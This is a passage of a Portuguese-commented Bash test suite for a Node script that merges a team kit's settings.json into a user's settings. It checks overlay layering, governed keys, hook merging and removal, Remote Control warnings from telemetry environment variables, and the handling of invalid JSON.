jsmod "$TMP/kit-t.json" "$TMP/kit-canal.json" 'd.autoUpdatesChannel = "stable"'
echo '{"autoUpdatesChannel":"latest"}' > "$TMP/overlay-canal.json"
cp "$TMP/mine-t.json" "$TMP/out-ov.json"
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-ov.json" --overlay "$TMP/overlay-canal.json" > "$TMP/out-ov.txt" 2>&1
check "canal: o overlay vence o kit" "d.autoUpdatesChannel" '"latest"' "$TMP/out-ov.json"
check "overlay não mexe no resto do merge" "d.permissions.defaultMode" '"bypassPermissions"' "$TMP/out-ov.json"
echo '{"autoUpdatesChannel":' > "$TMP/overlay-quebrado.json"
cp "$TMP/mine-t.json" "$TMP/out-oq.json"
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-oq.json" --overlay "$TMP/overlay-quebrado.json" > "$TMP/out-oq.txt" 2>&1
check "overlay quebrado: o merge segue com o valor do kit" "d.autoUpdatesChannel" '"stable"' "$TMP/out-oq.json"
saida_tem "aviso nomeia o overlay que foi ignorado" "$TMP/out-oq.txt" "overlay-quebrado.json"
# O time procura `line N` (mensagem do Python); aqui o formato é o do aviso do plugin.
if grep -q 'JSON inválido (linha [0-9]*, coluna [0-9]*)' "$TMP/out-oq.txt"; then echo "  ok    overlay com JSON inválido: o aviso diz linha e coluna"
else echo "  FALHA aviso do overlay inválido sem linha e coluna: $(cat "$TMP/out-oq.txt")"; falhas=$((falhas+1)); fi
echo '{}' > "$TMP/overlay-vazio.json"
cp "$TMP/mine-t.json" "$TMP/out-ovz.json"
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-ovz.json" --overlay "$TMP/overlay-vazio.json" > "$TMP/out-ovz.txt" 2>&1
if grep -qF 'overlay-vazio.json vazio' "$TMP/out-ovz.txt" && ! grep -qF 'inválido' "$TMP/out-ovz.txt"; then
  echo "  ok    overlay vazio: o aviso diz vazio, não inválido"
else echo "  FALHA aviso do overlay vazio: $(cat "$TMP/out-ovz.txt")"; falhas=$((falhas+1)); fi

jsmod "$TMP/kit-t.json" "$TMP/kit-hooks.json" 'd.hooks = { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "kit-guard.sh" }] }],
  Stop: [{ hooks: [{ type: "command", command: "kit-stop.sh" }] }] }'
cat > "$TMP/overlay-hooks.json" <<'JSON'
{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"pessoal-hook","timeout":5}]}],
          "PermissionRequest":[{"hooks":[{"type":"command","command":"pessoal-hook","timeout":120}]}]}}
JSON
jsmod "$TMP/mine-t.json" "$TMP/out-oh.json" 'd.hooks = { PreToolUse: [{ hooks: [{ type: "command", command: "pessoal-hook", timeout: 5 }] }] }'
node "$MERGE" "$TMP/kit-hooks.json" "$TMP/out-oh.json" --overlay "$TMP/overlay-hooks.json" >/dev/null 2>&1
check "hooks do overlay: o hook do kit continua no evento" \
  "d.hooks.PreToolUse.flatMap((g) => g.hooks).some((h) => h.command === 'kit-guard.sh')" "true" "$TMP/out-oh.json"
check "hooks do overlay: o pessoal entra no mesmo evento" \
  "d.hooks.PreToolUse.flatMap((g) => g.hooks).some((h) => h.command === 'pessoal-hook')" "true" "$TMP/out-oh.json"
check "hooks do overlay: evento que o kit não tem é criado" "d.hooks.PermissionRequest[0].hooks[0].timeout" "120" "$TMP/out-oh.json"
check "hooks do overlay: evento só do kit fica intacto" "d.hooks.Stop[0].hooks[0].command" '"kit-stop.sh"' "$TMP/out-oh.json"
check "hooks do overlay: o mesmo comando não entra duas vezes" \
  "d.hooks.PreToolUse.flatMap((g) => g.hooks).filter((h) => h.command === 'pessoal-hook').length" "1" "$TMP/out-oh.json"
ANTES_OH="$(cat "$TMP/out-oh.json")"
node "$MERGE" "$TMP/kit-hooks.json" "$TMP/out-oh.json" --overlay "$TMP/overlay-hooks.json" >/dev/null 2>&1
[ "$ANTES_OH" = "$(cat "$TMP/out-oh.json")" ] && echo "  ok    hooks do overlay: segunda execução é idempotente" \
  || { echo "  FALHA hooks do overlay: a segunda execução mudou o arquivo"; falhas=$((falhas+1)); }

echo "== overlay: lista de hooks a remover (generaliza o dispatch antigo do dotcontext) =="
echo '{"$merge":{"hooksRemovidos":["afplay /System/Library/Sounds/Glass.aiff"]}}' > "$TMP/overlay-rm.json"
merge_em out-rm "$TMP/mine-t.json" --overlay "$TMP/overlay-rm.json"
check "hook listado no overlay sai" \
  "d.hooks.PreToolUse.flatMap((g) => g.hooks).filter((h) => h.command.includes('afplay')).length" "0" "$TMP/out-rm.json"
check "hook da pessoa fora da lista fica" \
  "d.hooks.PreToolUse.flatMap((g) => g.hooks).some((h) => h.command === 'rtk hook claude')" "true" "$TMP/out-rm.json"
saida_tem "a saída nomeia o hook que o overlay tirou" "$TMP/out-rm.txt" "removido: hook listado no overlay (1)"

echo "== portado do time: env que desliga o Remote Control avisa (regra da CLI 2.1.280) =="
# DISABLE_TELEMETRY e NONESSENTIAL_TRAFFIC bloqueiam com qualquer valor não vazio, "0" incluso;
# DO_NOT_TRACK e DISABLE_GROWTHBOOK só com 1/true/yes/on.
saida_tem "avisa: DISABLE_TELEMETRY=1 da máquina" "$TMP/out-t.txt" "Remote Control"
aviso_rc() { # aviso_rc <env em JSON> → 0 se o merge avisou do Remote Control
  printf '{"env":%s}\n' "$1" > "$TMP/rc.json"
  # Captura antes de procurar: com `node | grep -q` e pipefail, o grep sai no primeiro match,
  # o node pode levar EPIPE e o ok vira FALHA (o time viu isso no Linux).
  node "$MERGE" "$TMP/kit-t.json" "$TMP/rc.json" > "$TMP/rc.txt" 2>&1
  grep -qF 'Remote Control' "$TMP/rc.txt"
}
for caso in '{"DISABLE_TELEMETRY":"0"}' '{"CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC":"1"}' \
            '{"DO_NOT_TRACK":"true"}' '{"DISABLE_GROWTHBOOK":"1"}'; do
  if aviso_rc "$caso"; then echo "  ok    avisa: $caso"; else echo "  FALHA não avisou, e a CLI bloqueia: $caso"; falhas=$((falhas+1)); fi
done
for caso in '{"DO_NOT_TRACK":"0"}' '{"DO_NOT_TRACK":"false"}' '{"DISABLE_TELEMETRY":""}'; do
  if aviso_rc "$caso"; then echo "  FALHA avisou, e a CLI não bloqueia: $caso"; falhas=$((falhas+1)); else echo "  ok    cala: $caso"; fi
done

echo "== portado do time: settings.json inválido e vazio =="
printf '{\n  "permissions": { "allow": ["Bash(foo:*)"], },\n  "env": { "X": "1" }\n}\n' > "$TMP/mine-quebrado.json"
cp "$TMP/mine-quebrado.json" "$TMP/mq-antes.json"
node "$MERGE" "$TMP/kit-t.json" "$TMP/mine-quebrado.json" > "$TMP/mq.txt" 2>&1
saida_tem "o aviso de JSON inválido nomeia o arquivo" "$TMP/mq.txt" "mine-quebrado.json"
cmp -s "$TMP/mq-antes.json" "$TMP/mine-quebrado.json" && echo "  ok    settings inválido fica intacto" \
  || { echo "  FALHA o merge reescreveu o settings inválido"; falhas=$((falhas+1)); }
: > "$TMP/out-mv.json"
node "$MERGE" "$TMP/kit-t.json" "$TMP/out-mv.json" >/dev/null 2>&1
check "settings vazio não tem o que perder: vira o do kit" "d.advisorModel" '"opus"' "$TMP/out-mv.json"

echo "== portado do time: idempotência e regra decidida para toda chave dict do template =="
ANTES_T="$(cat "$O")"
node "$MERGE" "$TMP/kit-t.json" "$O" --overlay "$TMP/regras-t.json" --skills-dir "$TMP/skills-t" >/dev/null 2>&1
[ "$ANTES_T" = "$(cat "$O")" ] && echo "  ok    a fixture do time mesclada duas vezes não muda" \
  || { echo "  FALHA a segunda passada na fixture do time mudou o arquivo"; falhas=$((falhas+1)); }
# Chave dict nova no template precisa de regra decidida no merge: sem ela, "o seu ganha no
# nível da chave" esconde o que o kit acrescentar dentro dela (foi o caso do
# extraKnownMarketplaces, #160). Quem acrescentar a chave decide a regra e a registra aqui.
SEM_REGRA="$(node -e '
const ok = ["enabledPlugins", "env", "extraKnownMarketplaces", "hooks", "modelSettings", "permissions", "skillOverrides", "statusLine"]
const t = require(process.argv[1])
console.log(Object.keys(t).filter((k) => t[k] && typeof t[k] === "object" && !Array.isArray(t[k]) && !ok.includes(k)).join(" "))' "$TEMPLATE")"
[ -z "$SEM_REGRA" ] && echo "  ok    toda chave dict do template tem regra de merge decidida" \
  || { echo "  FALHA chave dict do template sem regra de merge decidida: $SEM_REGRA"; falhas=$((falhas+1)); }

echo "== conflito 1 decidido: chave escalar — a da pessoa fica; \$merge.chavesGovernadas devolve ao kit =="
jsmod "$TMP/mine-t.json" "$TMP/mine-canal.json" 'd.autoUpdatesChannel = "latest"'
cp "$TMP/mine-canal.json" "$TMP/out-c0.json"
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-c0.json" >/dev/null 2>&1
check "canal: sem overlay, o latest da pessoa fica (padrão do plugin)" "d.autoUpdatesChannel" '"latest"' "$TMP/out-c0.json"
echo '{"$merge":{"chavesGovernadas":["autoUpdatesChannel"]}}' > "$TMP/overlay-gov.json"
cp "$TMP/mine-canal.json" "$TMP/out-c1.json"
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-c1.json" --overlay "$TMP/overlay-gov.json" > "$TMP/out-c1.txt" 2>&1
check "canal: com chavesGovernadas o kit governa (o latest da máquina volta a stable)" "d.autoUpdatesChannel" '"stable"' "$TMP/out-c1.json"
check "chavesGovernadas não mexe na chave que não lista (theme da pessoa fica)" "d.theme" '"auto"' "$TMP/out-c1.json"
saida_tem "a saída diz que a chave governada voltou ao valor do kit" "$TMP/out-c1.txt" "autoUpdatesChannel"
echo '{"autoUpdatesChannel":"latest","$merge":{"chavesGovernadas":["autoUpdatesChannel"]}}' > "$TMP/overlay-gov-latest.json"
jsmod "$TMP/mine-t.json" "$TMP/out-c2.json" 'd.autoUpdatesChannel = "stable"'
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-c2.json" --overlay "$TMP/overlay-gov-latest.json" >/dev/null 2>&1
check "canal: o valor do overlay vence o kit e governa a máquina" "d.autoUpdatesChannel" '"latest"' "$TMP/out-c2.json"
ANTES_C="$(cat "$TMP/out-c1.json")"
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-c1.json" --overlay "$TMP/overlay-gov.json" >/dev/null 2>&1
[ "$ANTES_C" = "$(cat "$TMP/out-c1.json")" ] && echo "  ok    chavesGovernadas: a segunda passada não muda nada" \
  || { echo "  FALHA chavesGovernadas: a segunda passada mudou o arquivo"; falhas=$((falhas+1)); }

echo "== conflito 2 decidido: hook da pessoa fora do kit — fica; \$merge.removerHooksAlheios tira e avisa =="
# Fixture do time: o kit reescreveu o rtk, virou script inline (check-careful), passou hook de
# Bash para sub-hook de dispatcher (o script continua em hooks/ ao lado do settings.json do kit),
# entrega um script por outro caminho (scriptsEntregues, a nucleo.lista do time) e trocou o
# dotcontext inline por um script com o nome dele. Só o afplay sai de verdade.
mkdir -p "$TMP/kit-rh/hooks"; : > "$TMP/kit-rh/hooks/warn-sem-jq.sh"
jsmod "$TMP/kit-t.json" "$TMP/kit-rh/settings.json" 'd.hooks.PreToolUse[0].hooks.push({ type: "command",
  command: "if [ -f \"$HOME/.claude/hooks/pre-bash.sh\" ]; then bash \"$HOME/.claude/hooks/pre-bash.sh\"; exit $?; fi; exit 0" });
d.hooks.SessionStart = [{ matcher: "*", hooks: [{ type: "command", command: "bash $HOME/.claude/hooks/dotcontext-session.sh" }] }]'
jsmod "$TMP/mine-t.json" "$TMP/mine-rh.json" 'd.hooks = {
  PreToolUse: [{ matcher: "Bash", hooks: [
    { type: "command", command: "rtk hook claude" },
    { type: "command", command: "afplay /System/Library/Sounds/Glass.aiff &" },
    { type: "command", command: "mkdir -p $HOME/.claude/.cache/check-careful; echo oi" },
    { type: "command", command: "if [ -f \"$HOME/.claude/hooks/block-main-commit.sh\" ]; then bash \"$HOME/.claude/hooks/block-main-commit.sh\"; exit $?; fi; exit 0" },
    { type: "command", command: "if [ -f \"$HOME/.claude/hooks/warn-sem-jq.sh\" ]; then bash \"$HOME/.claude/hooks/warn-sem-jq.sh\"; exit $?; fi; exit 0" } ] }],
  SessionStart: [{ matcher: "*", hooks: [
    { type: "command", command: "[ \"$PWD\" != \"$HOME\" ] && npx -y @dotcontext/cli@1.1.1 hook dispatch --source claude-code || exit 0" } ] }] }'
cp "$TMP/mine-rh.json" "$TMP/out-rh0.json"
node "$MERGE" "$TMP/kit-rh/settings.json" "$TMP/out-rh0.json" >/dev/null 2>&1
check "sem a flag, o hook da pessoa fora do kit fica (padrão do plugin)" \
  "Object.values(d.hooks).flat().flatMap((g) => g.hooks).some((h) => h.command.startsWith('afplay'))" "true" "$TMP/out-rh0.json"
cat > "$TMP/overlay-rh.json" <<'JSON'
{ "hooks": { "PermissionRequest": [{ "hooks": [{ "type": "command", "command": "pessoal-hook", "timeout": 120 }] }] },
  "$merge": { "removerHooksAlheios": true, "scriptsEntregues": ["block-main-commit.sh"] } }
JSON
jsmod "$TMP/mine-rh.json" "$TMP/out-rh.json" 'd.hooks.PermissionRequest = [{ hooks: [{ type: "command", command: "pessoal-hook", timeout: 120 }] }]'
node "$MERGE" "$TMP/kit-rh/settings.json" "$TMP/out-rh.json" --overlay "$TMP/overlay-rh.json" > "$TMP/out-rh.txt" 2>&1
check "com removerHooksAlheios, o hook fora do kit sai" \
  "Object.values(d.hooks).flat().flatMap((g) => g.hooks).filter((h) => h.command.includes('afplay')).length" "0" "$TMP/out-rh.json"
check "com removerHooksAlheios, nenhum hook chama o rtk cru" \
  "Object.values(d.hooks).flat().flatMap((g) => g.hooks).filter((h) => h.command === 'rtk hook claude').length" "0" "$TMP/out-rh.json"
check "com removerHooksAlheios, os hooks do kit e do overlay ficam" \
  "Object.values(d.hooks).flat().flatMap((g) => g.hooks).map((h) => h.command).filter((c) => /check-careful.sh|pre-bash.sh|dotcontext-session.sh|^pessoal-hook$/.test(c)).length" "4" "$TMP/out-rh.json"
saida_tem "aviso nomeia o hook que realmente sai" "$TMP/out-rh.txt" "afplay"
saida_tem "aviso diz que o backup é de quem chamou o merge" "$TMP/out-rh.txt" "backup"
saida_sem "aviso ignora hook substituído pelo kit" "$TMP/out-rh.txt" "rtk hook claude"
saida_sem "aviso ignora hook que virou script do kit" "$TMP/out-rh.txt" "check-careful"
saida_sem "aviso ignora hook que virou sub-hook do dispatcher (script ainda no kit)" "$TMP/out-rh.txt" "warn-sem-jq"
saida_sem "aviso ignora hook que o kit entrega por outro caminho (scriptsEntregues)" "$TMP/out-rh.txt" "block-main-commit"
saida_sem "aviso ignora ferramenta inline que virou script do kit" "$TMP/out-rh.txt" "dotcontext/cli"
saida_sem "hook do overlay não é anunciado como removido" "$TMP/out-rh.txt" "pessoal-hook"
ANTES_RH="$(cat "$TMP/out-rh.json")"
node "$MERGE" "$TMP/kit-rh/settings.json" "$TMP/out-rh.json" --overlay "$TMP/overlay-rh.json" > "$TMP/out-rh2.txt" 2>&1
[ "$ANTES_RH" = "$(cat "$TMP/out-rh.json")" ] && ! grep -q 'REMOVIDO' "$TMP/out-rh2.txt" \
  && echo "  ok    removerHooksAlheios: a segunda passada não muda nem avisa de novo" \
  || { echo "  FALHA removerHooksAlheios: a segunda passada mudou ou avisou: $(cat "$TMP/out-rh2.txt")"; falhas=$((falhas+1)); }

echo "== conflito 3 decidido: settings.json inválido — rc 0 por padrão, rc != 0 com --estrito =="
cp "$TMP/mq-antes.json" "$TMP/mq-padrao.json"
rc=0; node "$MERGE" "$TMP/kit-t.json" "$TMP/mq-padrao.json" > "$TMP/mq-padrao.txt" 2>&1 || rc=$?
esperado "sem --estrito, JSON inválido sai 0 (o kit-setup.sh com set -e segue)" "$rc" "0"
cp "$TMP/mq-antes.json" "$TMP/mq-estrito.json"
rc=0; node "$MERGE" "$TMP/kit-t.json" "$TMP/mq-estrito.json" --estrito > "$TMP/mq-estrito.txt" 2>&1 || rc=$?
if [ "$rc" -ne 0 ]; then echo "  ok    com --estrito, JSON inválido: o merge recusa (rc=$rc)"
else echo "  FALHA com --estrito, JSON inválido saiu 0"; falhas=$((falhas+1)); fi
saida_tem "com --estrito, o erro nomeia o arquivo" "$TMP/mq-estrito.txt" "mq-estrito.json"
cmp -s "$TMP/mq-antes.json" "$TMP/mq-estrito.json" && echo "  ok    com --estrito, o arquivo inválido fica intacto" \
  || { echo "  FALHA com --estrito, o arquivo inválido foi reescrito"; falhas=$((falhas+1)); }
cp "$TMP/mine-t.json" "$TMP/out-est-ok.json"
rc=0; node "$MERGE" "$TMP/kit-t.json" "$TMP/out-est-ok.json" --estrito >/dev/null 2>&1 || rc=$?
esperado "com --estrito, settings válido mescla e sai 0" "$rc" "0"

echo "== --overlay repetível: as regras do time e a chave de uma pessoa, em camadas =="
# O time tem duas camadas: o \$merge da casa (regras) e o settings.<quem>.json (o canal de update
# do Ruan). Uma camada só obrigaria o time a gerar um arquivo combinado a cada update.
echo '{"$merge":{"chavesGovernadas":["autoUpdatesChannel"],"allowsRevogados":{"Bash(velho1:*)":null}}}' > "$TMP/ov-regras.json"
echo '{"autoUpdatesChannel":"latest","$merge":{"allowsRevogados":{"Bash(velho2:*)":null}}}' > "$TMP/ov-pessoa.json"
jsmod "$TMP/mine-t.json" "$TMP/out-ovr.json" 'd.autoUpdatesChannel = "stable"; d.permissions = d.permissions || {};
d.permissions.allow = ["Bash(velho1:*)", "Bash(velho2:*)", "Bash(meu:*)"]'
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-ovr.json" --overlay "$TMP/ov-regras.json" --overlay "$TMP/ov-pessoa.json" > "$TMP/out-ovr.txt" 2>&1
check "duas camadas: a regra da 1ª governa o valor da 2ª (stable da máquina vira latest)" "d.autoUpdatesChannel" '"latest"' "$TMP/out-ovr.json"
check "as listas do \$merge das duas camadas se somam (velho1 e velho2 saem)" \
  "d.permissions.allow.filter((p) => p.startsWith('Bash(velho')).length" '0' "$TMP/out-ovr.json"
check "…e o allow da pessoa fica" "d.permissions.allow.includes('Bash(meu:*)')" 'true' "$TMP/out-ovr.json"
echo '{"theme":"a"}' > "$TMP/ov-a.json"; echo '{"theme":"b","$merge":{"chavesGovernadas":["theme"]}}' > "$TMP/ov-b.json"
cp "$TMP/mine-t.json" "$TMP/out-ovab.json"
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-ovab.json" --overlay "$TMP/ov-a.json" --overlay "$TMP/ov-b.json" >/dev/null 2>&1
check "mesma chave em duas camadas: a última vence" "d.theme" '"b"' "$TMP/out-ovab.json"

echo "== \$merge.modoDaPessoa: o defaultMode que a pessoa escolheu fica (o do time) =="
echo '{"$merge":{"modoDaPessoa":true}}' > "$TMP/ov-modo.json"
for m in default acceptEdits; do
  jsmod "$TMP/mine-t.json" "$TMP/out-modo-$m.json" "d.permissions = d.permissions || {}; d.permissions.defaultMode = '$m'"
  node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-modo-$m.json" --overlay "$TMP/ov-modo.json" > "$TMP/out-modo-$m.txt" 2>&1
  check "modoDaPessoa: $m fica" "d.permissions.defaultMode" "\"$m\"" "$TMP/out-modo-$m.json"
done
saida_sem "modoDaPessoa: não ensina a voltar ao manual (nada foi trocado)" "$TMP/out-modo-default.txt" "pra voltar ao manual"
jsmod "$TMP/mine-t.json" "$TMP/out-modo-sem.json" 'd.permissions = d.permissions || {}; delete d.permissions.defaultMode'
node "$MERGE" "$TMP/kit-canal.json" "$TMP/out-modo-sem.json" --overlay "$TMP/ov-modo.json" >/dev/null 2>&1
check "modoDaPessoa: sem modo na máquina, vale o do kit" "d.permissions.defaultMode" '"auto"' "$TMP/out-modo-sem.json"

echo "== chavesGovernadas: objeto sem regra própria é governado inteiro; com regra própria, não =="
jsmod "$TMP/kit-canal.json" "$TMP/kit-obj.json" 'd.statusLine = { type: "command", command: "bash ~/.claude/statusline-command.sh" }; d.env = { DO_KIT: "1" }'
jsmod "$TMP/mine-t.json" "$TMP/out-obj.json" 'd.statusLine = { type: "command", command: "outra" }; d.env = { MINHA: "1" }'
echo '{"$merge":{"chavesGovernadas":["statusLine","env"]}}' > "$TMP/ov-obj.json"
node "$MERGE" "$TMP/kit-obj.json" "$TMP/out-obj.json" --overlay "$TMP/ov-obj.json" >/dev/null 2>&1
check "statusLine governada: volta ao do kit" "d.statusLine.command" '"bash ~/.claude/statusline-command.sh"' "$TMP/out-obj.json"
check "env listada em chavesGovernadas segue a regra dela (união: a da pessoa fica)" "d.env.MINHA" '"1"' "$TMP/out-obj.json"
check "…e a do kit entra" "d.env.DO_KIT" '"1"' "$TMP/out-obj.json"

echo
if [ "$falhas" -eq 0 ]; then echo "tudo verde"; else echo "$falhas falha(s)"; exit 1; fi
